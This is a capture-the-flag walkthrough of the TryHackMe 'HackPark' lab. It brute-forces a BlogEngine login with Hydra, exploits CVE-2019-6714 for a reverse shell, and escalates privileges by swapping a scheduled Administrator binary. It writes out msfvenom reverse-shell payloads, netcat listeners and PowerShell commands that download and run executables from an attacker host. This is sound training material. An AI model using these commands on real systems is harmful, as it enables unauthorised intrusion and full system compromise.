# HackPark

**Room Link:** [https://tryhackme.com/room/hackpark](https://tryhackme.com/room/hackpark)



### Using Hydra to brute-force a login

**What request type is the Windows website login form using?**

<figure><img src="../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

**Crafting request for Hydra**

Sent a failed login request to Burp to see what it would look like. With this info I was able to craft my request for hydra. I just needed to get the URL and everything that is sent after VIEWSTATE and just change the input to use ^USER^ and ^PASS^ to brute force these fields.

<figure><img src="../../.gitbook/assets/image (20) (1) (1).png" alt=""><figcaption></figcaption></figure>

I could also do this without burp by just opening the console and getting the info from there

<figure><img src="../../.gitbook/assets/image (7) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt 10.10.110.93 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=vvTqZ%2FG4tEKhQoxeTpJ%2FyGxM9ZY9ZIvd6YMUS%2BoY3uaQCjC%2BJRdlkd8rbIQsDHztL%2BjsAvOLJhxU7vTNo3GP%2FLEmsndGPNAlCDn%2FB%2FrK2ynp9QkhRe9iqKBUmM5FQT2kX%2Bg%2BfPDNnTuzqW5IlmTujw4sLEzbvvec9FDW4cbQevgTj1tHnKx0vMmkVah5imro0o%2BHvQ5%2FGvpafEs1NdnW6wrSsUFuXnYzletKCdLG%2FgSb7bCDOK4ukZK%2F1cMOgYtjOCU4gk4M7PhQcYZmGpAN7pPVCMpX2YwGnTSgBPPmCB6avoLqG5jRS%2F3PYMjsqEGcD9P9S555GMQPxtfyvOEaJw%2B%2BZELKU2yVYr4uWxamEITsWNAT&__EVENTVALIDATION=Tp%2B5DS80H3PFB8ipJ24uKyHkPhSkqKD7GFJlc2U6IaO61l68aholdIjrZJ%2FsotSi0QxRBQjayWovmb2SU%2Fk6lY%2BOpju62jOGDkAvqcdNsqGrgf3vrAYw88XT2ONABFvDTR771I2YAr7JylJ0HbBZV83nGvvXWSC6rmKDGn80%2FuszTjDZ&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed" -V
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3) (3) (2).png" alt=""><figcaption><p>Credentials found</p></figcaption></figure>

### Compromise the machine

**Now you have logged into the website, are you able to identify the version of the BlogEngine?**

<figure><img src="../../.gitbook/assets/image (22) (1) (1).png" alt=""><figcaption></figcaption></figure>

**What is the CVE?**

CVE-2019-6714

**Exploit Link:** [https://www.exploit-db.com/exploits/46353](https://www.exploit-db.com/exploits/46353)

**Using the public exploit, gain initial access to the server. Who is the webserver running as?**

Created the file mentioned in the exploit, just changed the IP to my IP.

<figure><img src="../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

Setup a nc listener&#x20;

```
rlwrap nc -lvnp 4445
```

Upload the file

<figure><img src="../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (12) (2).png" alt=""><figcaption></figcaption></figure>

Navigate to the link and the nc listener should have caught it

<figure><img src="../../.gitbook/assets/image (1) (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (20) (2).png" alt=""><figcaption></figcaption></figure>

### **Windows Privilege Escalation**

**Setting up meterpreter shell**

**Kali #1**&#x20;

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.218.233 LPORT=1337 -e x86/shikata_ga_nai -f exe -o reverse.exe
python2 -m SimpleHTTPServer 81
```

**Kali #2**&#x20;

```
msfconsole 
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST 10.10.218.233  
set LPORT 1337 
run
```

**Victim**&#x20;

```
cd C:\Windows\Temp powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.218.233:81/reverse.exe','reverse.exe')" reverse.exe
```

**What is the OS version of this windows machine?**

<figure><img src="../../.gitbook/assets/image (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

**Further enumerate the machine. What is the name of the abnormal **_**service**_** running?**

****

**Check Windows Exploit Suggester**

**Kali**

```
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git 
cd Windows-Exploit-Suggester/ 
python3.9 windows-exploit-suggester.py --update 
python3.9 windows-exploit-suggester2.py --database 2022-12-03-mssb.xls --systeminfo systeminfo.txt
```

**Transfer WinPeas**

**Kali**&#x20;

```
wget https://github.com/carlospolop/PEASS-ng/releases/download/20221127/winPEASx64.exe 
python2 -m SimpleHTTPServer 81
```

**Victim**&#x20;

```
cd C:\Windows\Temp
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.218.233:81/winPEASx64.exe','winPEASx64.exe')" 
winPEASx64.exe
```

``![](<../../.gitbook/assets/image (25) (1) (1).png>)``

<figure><img src="../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

```
cd C:\Program Files (x86)\SystemScheduler\Events
type 20198415519.INI_LOG.txt
```

We can see Message.exe is kept being ran by Administrator so we just need to replace the file with our reverse shell, setup a listener and wait for the Administrator to try to run it.

<figure><img src="../../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption><p>Message.exe is called by Administrator </p></figcaption></figure>



**Kali**&#x20;

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.218.233 LPORT=1337 -f exe -o Message.exe 
python2 -m SimpleHTTPServer 81 rlwrap nc -lvnp 1337
```

**Victim**&#x20;

```
cd C:\Program Files (x86)\SystemScheduler 
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.218.233:81/Message.exe','Message.exe')"
```

<figure><img src="../../.gitbook/assets/image (16) (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

